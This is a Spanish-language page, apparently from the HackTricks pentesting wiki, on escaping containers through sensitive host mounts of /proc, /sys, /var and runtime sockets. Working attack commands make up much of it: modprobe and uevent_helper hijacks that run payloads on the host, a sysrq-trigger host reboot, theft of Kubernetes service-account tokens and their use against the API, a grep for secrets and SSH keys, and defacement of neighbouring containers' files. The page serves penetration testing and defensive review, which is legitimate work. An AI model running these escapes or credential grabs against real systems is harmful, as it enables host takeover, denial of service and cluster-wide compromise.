# Montajes sensibles del host

{{#include ../../../banners/hacktricks-training.md}}

## Resumen

Los montajes del host son una de las superficies prácticas de escape de contenedores más importantes porque a menudo colapsan una vista de procesos cuidadosamente aislada devolviéndola a la visibilidad directa de recursos del host. Los casos peligrosos no se limitan a `/`. Los bind mounts de `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, o rutas relacionadas con dispositivos pueden exponer controles del kernel, credenciales, sistemas de archivos de contenedores vecinos e interfaces de gestión en tiempo de ejecución.

Esta página existe por separado respecto a las páginas de protección individuales porque el modelo de abuso es transversal. Un montaje de host escribible es peligroso en parte por los mount namespaces, en parte por los user namespaces, en parte por la cobertura de AppArmor o SELinux y en parte por qué ruta concreta del host quedó expuesta. Tratarlo como un tema propio facilita razonar sobre la superficie de ataque.

## Exposición de `/proc`

procfs contiene tanto información ordinaria de procesos como interfaces de control del kernel de alto impacto. Un bind mount como `-v /proc:/host/proc` o una vista del contenedor que exponga entradas de proc inesperadas y escribibles puede por tanto conducir a divulgación de información, denegación de servicio o ejecución directa de código en el host.

Rutas de procfs de alto valor incluyen:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuso

Comience comprobando qué entradas de procfs de alto valor son visibles o escribibles:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Estas rutas son interesantes por distintas razones. `core_pattern`, `modprobe`, y `binfmt_misc` pueden convertirse en vectores de ejecución de código en host cuando son escribibles. `kallsyms`, `kmsg`, `kcore`, y `config.gz` son fuentes poderosas de reconocimiento para explotación del kernel. `sched_debug` y `mountinfo` revelan contexto de procesos, cgroups y sistemas de ficheros que pueden ayudar a reconstruir la disposición del host desde dentro del container.

El valor práctico de cada ruta es diferente, y tratarlas todas como si tuvieran el mismo impacto complica la priorización:

- `/proc/sys/kernel/core_pattern`
Si es escribible, esta es una de las rutas de procfs de mayor impacto porque el kernel ejecutará un pipe handler tras un crash. Un container que pueda apuntar `core_pattern` a una payload almacenada en su overlay o en una ruta montada del host puede frecuentemente obtener ejecución de código en host. See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.
- `/proc/sys/kernel/modprobe`
Esta ruta controla el helper de userspace que usa el kernel cuando necesita invocar la lógica de carga de módulos. Si es escribible desde el container y se interpreta en el contexto del host, puede convertirse en otro primitivo de ejecución de código en host. Es especialmente interesante cuando se combina con una forma de desencadenar la ruta del helper.
- `/proc/sys/vm/panic_on_oom`
Normalmente no es un primitive limpio de escape, pero puede convertir la presión de memoria en un denial of service a nivel de host al transformar condiciones OOM en comportamiento de kernel panic.
- `/proc/sys/fs/binfmt_misc`
Si la interfaz de registro es escribible, el atacante puede registrar un handler para un valor magic elegido y obtener ejecución en contexto host cuando se ejecute un fichero que coincida.
- `/proc/config.gz`
Útil para el triage de exploits del kernel. Ayuda a determinar qué subsistemas, mitigaciones y opciones del kernel están habilitadas sin necesitar metadatos de paquetes del host.
- `/proc/sysrq-trigger`
Mayormente una ruta de denial-of-service, pero muy seria. Puede reiniciar, provocar panic, o interrumpir el host de inmediato.
- `/proc/kmsg`
Reveals kernel ring buffer messages. Útil para fingerprinting del host, análisis de crashes y, en algunos entornos, para leaking información útil para la explotación del kernel.
- `/proc/kallsyms`
Valiosa cuando es legible porque expone información de símbolos exportados del kernel y puede ayudar a derrotar suposiciones de aleatorización de direcciones durante el desarrollo de exploits del kernel.
- `/proc/[pid]/mem`
Es una interfaz directa a la memoria de procesos. Si el proceso objetivo es alcanzable bajo las condiciones ptrace-style necesarias, puede permitir leer o modificar la memoria de otro proceso. El impacto realista depende en gran medida de credenciales, `hidepid`, Yama y restricciones de ptrace, por lo que es una ruta potente pero condicionada.
- `/proc/kcore`
Expone una vista tipo imagen de core de la memoria del sistema. El fichero es enorme y engorroso de usar, pero si es significativamente legible indica una superficie de memoria del host mal expuesta.
- `/proc/kmem` and `/proc/mem`
Interfaces históricamente de alto impacto a memoria raw. En muchos sistemas modernos están deshabilitadas o muy restringidas, pero si están presentes y son utilizables deben tratarse como hallazgos críticos.
- `/proc/sched_debug`
Leaks scheduling and task information que puede exponer identidades de procesos del host incluso cuando otras vistas de procesos parecen más limpias de lo esperado.
- `/proc/[pid]/mountinfo`
Extremadamente útil para reconstruir dónde vive realmente el container en el host, qué rutas están respaldadas por overlay, y si un mount escribible corresponde al contenido del host o solo a la capa del container.

Si `/proc/[pid]/mountinfo` o los detalles del overlay son legibles, úsalos para recuperar la ruta en el host del sistema de ficheros del container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Estos comandos son útiles porque varias técnicas de ejecución en el host requieren convertir una ruta dentro del contenedor en la ruta correspondiente desde el punto de vista del host.

### Ejemplo completo: `modprobe` Helper Path Abuse

Si `/proc/sys/kernel/modprobe` es escribible desde el contenedor y la ruta del helper se interpreta en el contexto del host, puede redirigirse a un payload controlado por el atacante:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
El desencadenante exacto depende del objetivo y del comportamiento del kernel, pero lo importante es que una writable helper path puede redirigir una futura kernel helper invocation hacia contenido del host-path controlado por el atacante.

### Ejemplo completo: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Si el objetivo es la evaluación de explotabilidad en lugar de un escape inmediato:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Estos comandos ayudan a determinar si hay información útil de símbolos visible, si los mensajes recientes del kernel revelan un estado interesante y qué kernel features o mitigations están compiladas. El impacto normalmente no es un escape directo, pero puede acortar drásticamente el kernel-vulnerability triage.

### Ejemplo completo: SysRq Host Reboot

Si `/proc/sysrq-trigger` es escribible y llega a la vista del host:
```bash
echo b > /proc/sysrq-trigger
```
El efecto es el reinicio inmediato del host. Este no es un ejemplo sutil, pero demuestra claramente que la exposición de procfs puede ser mucho más grave que la mera divulgación de información.

## `/sys` Exposición

sysfs expone grandes cantidades de estado del kernel y de los dispositivos. Algunas rutas de sysfs son principalmente útiles para fingerprinting, mientras que otras pueden afectar la ejecución de helpers, el comportamiento del dispositivo, la configuración de security-module o el estado del firmware.

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Estas rutas son importantes por diferentes razones. `/sys/class/thermal` puede influir en el comportamiento de gestión térmica y, por lo tanto, en la estabilidad del host en entornos con exposición inadecuada. `/sys/kernel/vmcoreinfo` puede leak información de crash-dump y kernel-layout que ayuda al fingerprinting del host a bajo nivel. `/sys/kernel/security` es la interfaz `securityfs` usada por Linux Security Modules, por lo que un acceso inesperado allí puede exponer o alterar el estado relacionado con MAC. Las rutas de variables EFI pueden afectar los ajustes de arranque respaldados por firmware, lo que las hace mucho más serias que los archivos de configuración ordinarios. `debugfs` bajo `/sys/kernel/debug` es especialmente peligroso porque es intencionalmente una interfaz orientada a desarrolladores con expectativas de seguridad mucho menores que las kernel APIs destinadas a producción y endurecidas.

Los comandos útiles para revisar estas rutas son:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Qué hace interesantes esos comandos:

- `/sys/kernel/security` puede revelar si AppArmor, SELinux u otra LSM están visibles de una manera que debería haberse mantenido exclusiva del host.
- `/sys/kernel/debug` suele ser el hallazgo más alarmante de este grupo. Si `debugfs` está montado y es legible o escribible, espere una amplia superficie expuesta al kernel cuyo riesgo exacto depende de los nodos de depuración habilitados.
- La exposición de variables EFI es menos común, pero si está presente tiene un alto impacto porque afecta configuraciones respaldadas por firmware en lugar de archivos de tiempo de ejecución ordinarios.
- `/sys/class/thermal` es principalmente relevante para la estabilidad del host y la interacción con el hardware, no para un escape tipo shell elegante.
- `/sys/kernel/vmcoreinfo` es principalmente una fuente de host-fingerprinting y crash-analysis, útil para entender el estado del kernel a bajo nivel.

### Ejemplo completo: `uevent_helper`

Si `/sys/kernel/uevent_helper` es escribible, el kernel puede ejecutar un helper controlado por un atacante cuando se desencadena un `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
La razón por la que esto funciona es que la ruta del helper se interpreta desde el punto de vista del host. Una vez activado, el helper se ejecuta en el contexto del host en lugar de dentro del contenedor actual.

## `/var` Exposición

Montar el `/var` del host en un contenedor suele subestimarse porque no parece tan dramático como montar `/`. En la práctica, puede ser suficiente para alcanzar runtime sockets, directorios de container snapshot, volúmenes de pod gestionados por kubelet, projected service-account tokens y los sistemas de archivos de aplicaciones vecinas. En nodos modernos, `/var` suele ser donde realmente vive el estado de contenedor más interesante desde el punto de vista operativo.

### Ejemplo de Kubernetes

Un pod con `hostPath: /var` a menudo puede leer los projected tokens de otros pods y el contenido de snapshot de overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Estos comandos son útiles porque responden si el punto de montaje expone solo datos de aplicación triviales o credenciales del clúster de alto impacto. Un service-account token legible puede convertir inmediatamente local code execution en acceso a la Kubernetes API.

Si el token está presente, valida a qué puede acceder en lugar de detenerte en token discovery:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
El impacto aquí puede ser mucho mayor que el acceso local al nodo. Un token con RBAC amplio puede convertir un `/var` montado en una compromisión a nivel de clúster.

### Ejemplo: Docker y containerd

En hosts Docker, los datos relevantes suelen estar bajo `/var/lib/docker`, mientras que en nodos Kubernetes con containerd puede estar bajo `/var/lib/containerd` o en rutas específicas del snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Si el `/var` montado expone contenidos de snapshot escribibles de otra carga de trabajo, el atacante podría alterar archivos de la aplicación, plantar contenido web o modificar scripts de inicio sin tocar la configuración actual del contenedor.

Ideas concretas de abuso una vez que se encuentre contenido de snapshot escribible:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Estos comandos son útiles porque muestran las tres principales familias de impacto de `/var` montado: manipulación de la aplicación, recuperación de secretos y movimiento lateral hacia cargas de trabajo vecinas.

## Sockets de tiempo de ejecución

Los montajes sensibles del host suelen incluir sockets de tiempo de ejecución en lugar de directorios completos. Estos son tan importantes que merecen una repetición explícita aquí:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Consulta [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) para flujos completos de explotación una vez que uno de estos sockets esté montado.

Como patrón rápido de interacción inicial:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Si uno de estos tiene éxito, el camino desde "mounted socket" hasta "start a more privileged sibling container" suele ser mucho más corto que cualquier ruta de breakout del kernel.

## CVE relacionadas con mounts

Los host mounts también se intersectan con vulnerabilidades en tiempo de ejecución. Ejemplos recientes importantes incluyen:

- `CVE-2024-21626` en `runc`, donde un leaked directory file descriptor podría colocar el working directory en el host filesystem.
- `CVE-2024-23651` y `CVE-2024-23653` en `BuildKit`, donde OverlayFS copy-up races podrían producir host-path writes durante los builds.
- `CVE-2024-1753` en Buildah y Podman build flows, donde crafted bind mounts durante el build podrían exponer `/` read-write.
- `CVE-2024-40635` en `containerd`, donde un valor grande de `User` podría desbordarse hacia comportamiento de UID 0.

Estos CVEs importan aquí porque muestran que el manejo de mounts no se reduce solo a la configuración del operador. El runtime en sí mismo también puede introducir condiciones de escape impulsadas por mounts.

## Comprobaciones

Usa estos comandos para localizar rápidamente las exposiciones de mounts de mayor valor:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- Host root, `/proc`, `/sys`, `/var` y runtime sockets son hallazgos de alta prioridad.
- Las entradas proc/sys escribibles suelen significar que el mount está exponiendo controles del kernel globales del host en lugar de una vista segura del container.
- Las rutas montadas en `/var` merecen una revisión de credenciales y de neighboring-workload, no solo una revisión del filesystem.
{{#include ../../../banners/hacktricks-training.md}}
